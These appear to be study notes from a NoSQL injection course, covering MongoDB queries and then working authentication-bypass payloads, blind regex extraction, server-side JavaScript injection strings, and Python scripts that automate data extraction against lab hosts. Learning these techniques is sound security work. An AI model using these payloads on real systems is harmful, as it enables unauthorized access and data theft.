# Introduction to NoSQL Injection

## Types of NoSQL DB

| Type | Description | Top 3 Engines (as of November 2022) |
| --- | --- | --- |
| Document-Oriented Database | Stores data in documents which contain pairs of fields and values These documents are typically encoded in formats such as JSON or XML | MongoDB, Amazon DynamoDB, Google Firebase - Cloud Firestore |
| Key-Value Database | A data structure that stores data in key:value pairs, also known as a dictionary | Redis, Amazon DynamoDB, Azure Cosmos DB |
| Wide-Column Store | Used for storing enormous amounts of data in tables, rows, and columns like a relational database, but with the ability to handle more ambiguous data types | Apache Cassandra, Apache HBase, Azure Cosmos DB |
| Graph Database | Stores data in nodes and uses edges to define relationships | Neo4j, Azure Cosmos DB, Virtuoso |

## MongoDB

### Basic Commands

```bash
mongosh mongodb://127.0.0.1:27017 # connect to DB on default TCP port
show databases
use academy # databases created once data first stored
show collections # list all collections in a database
db.apples.insertOne({type: "Granny Smith", price: 0.65}); # collection when a document first inserted into it
db.apples.insertMany([{type: "Golden Delicious", price: 0.79}, {type: "Pink Lady", price: 0.90}]); # add multiple documents to collection
db.apples.find({type: "Granny Smith"}); # selecting data
db.apples.find({}); # list all documents in a collection
```

### Query Operators

| Type | Operator | Description | Example |
| --- | --- | --- | --- |
| Comparison | $eq | Matches values which are equal to a specified value | type: {$eq: "Pink Lady"} |
| Comparison | $gt | Matches values which are greater than a specified value | price: {$gt: 0.30} |
| Comparison | $gte | Matches values which are greater than or equal to a specified value | price: {$gte: 0.50} |
| Comparison | $in | Matches values which exist in the specified array | type: {$in: ["Granny Smith", "Pink Lady"]} |
| Comparison | $lt | Matches values which are less than a specified value | price: {$lt: 0.60} |
| Comparison | $lte | Matches values which are less than or equal to a specified value | price: {$lte: 0.75} |
| Comparison | $nin | Matches values which are not in the specified array | type: {$nin: ["Golden Delicious", "Granny Smith"]} |
| Logical | $and | Matches documents which meet the conditions of both specified queries | $and: [{type: 'Granny Smith'}, {price: 0.65}] |
| Logical | $not | Matches documents which do not meet the conditions of a specified query | type: {$not: {$eq: "Granny Smith"}} |
| Logical | $nor | Matches documents which do not meet the conditions of any of the specified queries | $nor: [{type: 'Granny Smith'}, {price: 0.79}] |
| Logical | $or | Matches documents which meet the conditions of one of the specified queries | $or: [{type: 'Granny Smith'}, {price: 0.79}] |
| Evaluation | $mod | Matches values which divided by a specific divisor have the specified remainder | price: {$mod: [4, 0]} |
| Evaluation | $regex | Matches values which match a specified RegEx | type: {$regex: /^G.*/} |
| Evaluation | $where | Matches documents which satisfy a JavaScript expression | $where: 'this.type.length === 9' |

```bash
# select all apples whose type starts with a 'G' and whose price is less than 0.70
db.apples.find({
    $and: [
        { type: { $regex: /^G/ } },
        { price: { $lt: 0.70 } }
    ]
});

# same but with where clause
db.apples.find({$where: `this.type.startsWith('G') && this.price < 0.70`});

#select the top two apples sorted by price in descending order
db.apples.find({}).sort({price: -1}).limit(2)
```

### Updating Documents

```bash
db.apples.updateOne({type: "Granny Smith"}, {$set: {price: 1.99}}) # update operations take a filter and an update operation
db.apples.updateMany({}, {$inc: {quantity: 1, "price": 1}}) # increase the prices of all apples at the same time
db.apples.replaceOne({type:'Pink Lady'}, {name: 'Pink Lady', price: 0.99, color: 'Pink'}) # completely replace the document
db.apples.remove({price: {$lt: 0.8}}) # remove matched documents
```

### Authentication bypass

```php
email[$ne]=test@test.com&password[$ne]=test // URL encoded parameters passed to PHP equal to password: {$ne: test}
email[$regex]=.*&email[$regex]=.* // alternative to also return a match on any document
email=admin%40mangomail.com&password[$ne]=x // when email known and password not known
email[$gt]=&password[$gt]= // any string is greater than an empty string
email[$gte]=&password[$gte]= // works same as previous
```

### In-Band Data Extraction

```bash
http://<ip>:<port>/?q[$regex]=.* # return whole collection get query
http://<ip>:<port>/?q[$ne]='doesntExist'
http://<ip>:<port>/?q[$gt]=''
http://<ip>:<port>/?q[$gte]=''
http://<ip>:<port>/?q[$gte]='~'
http://<ip>:<port>/?q[$lte]='~'
```

### Blind Data Extraction

```json
// Using regex to find a value char by char by comparing responses to the POST request
{
    "trackingNum":{
        "$regex":"^3.*"
    }
}
{
    "trackingNum":{
        "$regex":"^32.*"
    }
}
{
    "trackingNum":{
        "$regex":"^32A.*"
    }
}
```

#### Automating Blind Exploitation

```py
#!/usr/bin/python3

import requests
import json

# Oracle
def oracle(t):
    r = requests.post(
        "http://154.57.164.70:32584/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text # use part of the response to confirm request was valid

# Make sure the oracle is functioning correctly
assert (oracle("X") == False)
assert (oracle({"$regex": "^HTB{.*"}) == True)

# Dump the tracking number
trackingNum = "HTB{" # Tracking number is known to start with 'HTB{'
for _ in range(32): # Repeat the following 32 times
    for c in "0123456789abcdef": # Loop through characters [0-9a-f]
        if oracle({"$regex": "^" + trackingNum + c}): # Check if <trackingNum> + <char> matches with $regex
            trackingNum += c # If it does, append character to trackingNum ...
            break # ... and break out of the loop
trackingNum += "}" # Append known '}' to end of tracking number

# Make sure the tracking number is correct
assert (oracle(trackingNum) == True)

print("Tracking Number: " + trackingNum)
```

### Server-Side JavaScript Injection

```bash
# example backend script where javascript is used inside mongo query
db.users.find({$where: "this.username == \"" + req.body['username'] + "\" && this.password == \"" + req.body['password'] + "\""});

# basic bypass
username="+||+true+||+""=="&password=test

# bypass for finding specific user incrementally
username="+||+(this.username.match('^H.*'))+||+""=="&password=test
username="+||+(this.username.match('^HT.*'))+||+""=="&password=test
username="+||+(this.username.match('^HTB.*'))+||+""=="&password=test
```

#### Automating Server-Side JavaScript Injection

```py
#!/usr/bin/python3

import requests
from urllib.parse import quote_plus

# Oracle (answers True or False)
num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(
        "http://154.57.164.78:31105/index.php",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in r.text

# Ensure the oracle is working correctly
assert (oracle('false') == False)
assert (oracle('true') == True)

# Dump the username ('regular' search)
num_req = 0 # Set the request counter to 0
username = "HTB{" # Known beginning of username
i = 4 # Set i to 4 to skip the first 4 chars (HTB{)
while username[-1] != "}": # Repeat until we dump '}' (known end of username)
    for c in range(32, 128): # Loop through all printable ASCII chars
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) == %d' % (i, c)):
            username += chr(c) # Append current char to the username if it expression evaluates as True
            break # And break the loop
    i += 1 # Increment the index counter
assert (oracle('this.username == `%s`' % username) == True) # Verify the username
print("---- Regular search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
print()

# Dump the username (binary search)
num_req = 0 # Reset the request counter
username = "HTB{" # Known beginning of username
i = 4 # Skip the first 4 characters (HTB{)
while username[-1] != "}": # Repeat until we meet '}' aka end of username
    low = 32 # Set low value of search area (' ')
    high = 127 # Set high value of search area ('~')
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # If ASCII value of username at index 'i' < midpoint, increase the lower boundary and repeat
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # If ASCII value of username at index 'i' > midpoint, decrease the upper boundary and repeat
        else:
            username += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
            break # Break out of the loop
    i += 1 # Increment the index counter (start work on the next character)
assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
```

### Tools of the Trade

#### Wordlists

- [nosqlinjection_wordlists/mongodb_nosqli.txt](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)

#### [wfuzz](https://github.com/xmendez/wfuzz)

```bash
wfuzz -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt -u http://127.0.0.1/index.php -d '{"trackingNum": FUZZ}'
```

#### [NoSQLMap](https://github.com/codingo/NoSQLMap)

```bash
# install 
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
sudo apt install python2.7
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2 install couchdb
pip2 install --upgrade setuptools
pip2 install pbkdf2
pip2 install pymongo
pip2 install ipcalc

# example: testing if email and/or password field are vulnerable
python2 nosqlmap.py --attack 2 --victim 127.0.0.1 --webPort 80 --uri /index.php --httpMethod POST --postData email,admin@mangomail.com,password,qwerty --injectedParameter 1 --injectSize 4
```

**NOTE** burp has a NoSQLi scanner extention [Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner)